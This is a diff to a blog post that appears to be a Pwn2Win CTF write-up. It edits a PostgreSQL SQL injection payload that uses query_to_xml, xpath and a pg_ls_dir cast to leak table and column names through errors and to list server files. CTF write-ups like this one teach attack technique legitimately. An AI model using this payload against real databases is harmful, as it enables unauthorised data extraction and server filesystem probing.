@@ -19,7 +19,7 @@ I can execute a subquery like I want. Postgres has a very nice feature, if I cas
 ![_config.yml]({{ site.baseurl }}/images/4-pwn2win.png)
 I can list a file named pg_xlog. Now, I can read other file with payload
 {% highlight python linenos %}
-array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 0)) as int)', true,  false,'')),1)
+array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(42) || table_name FROM information_schema.columns c limit 1 offset 0)) as int)', true,  false,'')),1)
 {% endhighlight %}
 The output is:
 ![_config.yml]({{ site.baseurl }}/images/5-pwn2win.png)
